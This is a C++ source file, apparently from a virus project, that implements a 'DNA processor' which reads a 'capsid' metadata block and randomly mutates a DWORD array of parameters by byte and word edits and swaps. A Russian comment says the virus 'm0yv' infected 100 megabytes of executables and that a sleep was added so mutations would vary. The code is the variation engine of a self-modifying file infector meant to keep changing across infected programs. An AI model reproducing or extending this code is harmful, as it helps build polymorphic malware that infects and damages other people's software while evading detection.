#include "dna.hpp"
#include "capsid_tools.h"
#include "utils.hpp"

DefaultDNAProcessor::DefaultDNAProcessor()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultDNAProcessor] constructor");
#endif
	this->pdwDNACode = nullptr;
	this->capsid = nullptr;
	this->extended = nullptr;
}

DefaultDNAProcessor::~DefaultDNAProcessor()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultDNAProcessor] destructor");
#endif

	if (this->extended != nullptr)
	{
		delete[]this->extended;
		this->extended = nullptr;
	}
}

BOOL DefaultDNAProcessor::init(LPBYTE lpDataArray, SIZE_T dwDataSize)
{

	if ((lpDataArray == nullptr) || (dwDataSize <= sizeof(capsid_metadata)))
		return FALSE;

	this->capsid = (capsid_metadata*)lpDataArray;
	this->extended = (capsid_extended*)new BYTE[sizeof(capsid_extended) + 1];
	if (this->extended == nullptr)
		return FALSE;

	capsid_tools::get_extended(this->capsid, this->extended, sizeof(capsid_extended));
	this->pdwDNACode = this->extended->dwDNA;
	this->holdrand = GetTickCount();

	return TRUE;
}

BOOL DefaultDNAProcessor::mutate(DWORD dwParamMutation)
{
	DWORD dwMutationBorder = this->get_value(dna_fields_t::MUTATOR_BORDER, FALSE, 70, 140);
	if (dwMutationBorder >= dwParamMutation)
	{
#ifdef _DEBUG
		WriteLog(L"[DefaultDNAProcessor::mutate] mutator border is not yet reached, no mutation");
#endif
		return FALSE;
	}
	// воу-воу, полегче... m0yv заразил 100 мегабайт екзешников за 1 миллисекунду... мутатор не сработал ибо сид все время один... поэтому надо поспать хотя бы
	Sleep(10);

	dna_mutations_types_t dwMutation = (dna_mutations_types_t)(_rand(&holdrand) % dna_mutations_types_t::MUTATOR_TOTAL_TYPES);
	switch (dwMutation)
	{
	case dna_mutations_types_t::MUTATOR_BYTEARRAY_INCDEC:
	case dna_mutations_types_t::MUTATOR_BYTEARRAY_INVERSE:
	case dna_mutations_types_t::MUTATOR_BYTEARRAY_REPLACE:
		this->bytearray_mutate(dwMutation);
		break;
	case dna_mutations_types_t::MUTATOR_INVERSE:
	case dna_mutations_types_t::MUTATOR_INCDEC:
	case dna_mutations_types_t::MUTATOR_REPLACE:
		this->singledword_mutate(dwMutation);
		break;
	case dna_mutations_types_t::MUTATOR_SWAP:
		this->twodword_mutate(dwMutation);
		break;
	case dna_mutations_types_t::MUTATOR_SKIP:
		break;
	default:
#ifdef _DEBUG
		WriteLog(L"[DefaultDNAProcessor::mutate] ERROR: unknown switch case value");
#endif
		break;
	}

	this->extended->dwDNAMutatorCounter++;

	return TRUE;
}

DWORD DefaultDNAProcessor::get_value(DWORD dwValueIndex, BOOL bOriginal, DWORD dwOffset, DWORD dwMax)
{
	if (this->pdwDNACode == nullptr)
		return 0;

#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	DWORD dwResult = 0;
	if (bOriginal)
	{
		dwResult = this->pdwDNACode[dwValueIndex];
#ifdef _DEBUG
		wsprintfW(debugOut, L"[DefaultDNAProcessor::get_value] getting %d-th value is 0x%X", dwValueIndex, dwResult);
		WriteLog(debugOut);
#endif
		return dwResult;
	}
	dwResult = (this->pdwDNACode[dwValueIndex] % (dwMax - dwOffset)) + dwOffset;

	return dwResult;
}

BOOL DefaultDNAProcessor::update()
{
	capsid_tools::set_extended(this->capsid, this->extended, sizeof(capsid_extended));

	return TRUE;
}

LPBYTE DefaultDNAProcessor::get_dna()
{
	return (LPBYTE)this->pdwDNACode;
}

VOID DefaultDNAProcessor::bytearray_mutate(DWORD dwParam)
{
	DWORD dwArrayLen = sizeof(DWORD32) * dna_fields_t::DNA_FIELDS_TOTAL;
	LPBYTE lpBytesArray = (LPBYTE)this->pdwDNACode;

	// возьмем стартовый индекс внутри массива [0;dwArrayLen)
	DWORD dwStartIndex = _rand(&holdrand) % dwArrayLen;

	// возьмем последний индекс [dwStartIndex;dwArrayLen)
	// логика такова - пусть начальный индекс K, крайний - E, размер - N, изменения происходят по индексам [K, E) (т.е E исключительно)
	// тогда мы генерируем случайное число в диапазоне от 1 до N - K и прибавляем его к K
	// тогда минимальное значение в случае генерации 1 будет E = K + 1 то есть начальный индекс будет являться единственным подверженным изменению
	// максимальное значение в случае генерации = N - K, предположим K = 0, то есть E = N, тогда итерация произойдет от 0 индекса до последнего
	// последний индекс равен N - 1
	// если K = N - 1 (то есть стартовый индекс это последний индекс массива)
	// тогда максимальное значение в случае генерации = N - (N - 1) = N - N + 1 = 1
	// прибавим его к K, тогда E = N - 1 + 1 = N, то есть максимальное значение которое возможно сгенерировать также N и выхода за пределы массива не будет
	DWORD dwLastIndex = dwStartIndex + (_rand(&holdrand) % (dwArrayLen - dwStartIndex) + 1);

	for (DWORD i = dwStartIndex; i < dwLastIndex; i++)
	{
		switch (dwParam)
		{
		case dna_mutations_types_t::MUTATOR_BYTEARRAY_INCDEC:
			if (_rand(&holdrand) % 2)
				lpBytesArray[i] += _rand(&holdrand) % 2;
			else
				lpBytesArray[i] -= _rand(&holdrand) % 2;
			break;
		case dna_mutations_types_t::MUTATOR_BYTEARRAY_INVERSE:
			lpBytesArray[i] = ~lpBytesArray[i];
			break;
		case dna_mutations_types_t::MUTATOR_BYTEARRAY_REPLACE:
			lpBytesArray[i] = _rand(&holdrand) % 256;
			break;
		default:
#ifdef _DEBUG
			WriteLog("[DefaultDNAProcessor::bytearray_mutate] ERROR: unknown switch value");
#endif
			break;
		}
	}

	return;
}

VOID DefaultDNAProcessor::singledword_mutate(DWORD dwParam)
{

	DWORD dwIndex = _rand(&holdrand) % dna_fields_t::DNA_FIELDS_TOTAL;

	switch (dwParam)
	{
	case dna_mutations_types_t::MUTATOR_INCDEC:
		if (_rand(&holdrand) % 2)
		{
			this->pdwDNACode[dwIndex] += _rand(&holdrand) % 2;
		}
		else
		{
			this->pdwDNACode[dwIndex] -= _rand(&holdrand) % 2;
		}
		break;
	case dna_mutations_types_t::MUTATOR_INVERSE:
		this->pdwDNACode[dwIndex] = ~this->pdwDNACode[dwIndex];
		break;
	case dna_mutations_types_t::MUTATOR_REPLACE:
		this->pdwDNACode[dwIndex] = _rand(&holdrand);
		break;
	default:
#ifdef _DEBUG
		WriteLog("[DefaultDNAProcessor::singledword_mutate] ERROR: unknown switch value");
#endif
		break;
	}

	return;
}

VOID DefaultDNAProcessor::twodword_mutate(DWORD dwParam)
{
	DWORD dwFirstIndex = _rand(&holdrand) % dna_fields_t::DNA_FIELDS_TOTAL;
	DWORD dwSecondIndex = _rand(&holdrand) % dna_fields_t::DNA_FIELDS_TOTAL;
	UINT i = 0;
	while (dwFirstIndex == dwSecondIndex)
	{
		dwSecondIndex = _rand(&holdrand) % dna_fields_t::DNA_FIELDS_TOTAL;
		i++;
		// мир хочет чтобы мутации не произошло
		if (i > 10)
			break;
	}
	DWORD dwTmp = 0;
	switch (dwParam)
	{
	case dna_mutations_types_t::MUTATOR_SWAP:
		dwTmp = this->pdwDNACode[dwFirstIndex];
		this->pdwDNACode[dwFirstIndex] = this->pdwDNACode[dwSecondIndex];
		this->pdwDNACode[dwSecondIndex] = dwTmp;
		break;
	default:
#ifdef _DEBUG
		WriteLog("[DefaultDNAProcessor::twodword_mutate] ERROR: unknown switch value");
#endif
		break;
	}
	return;
}
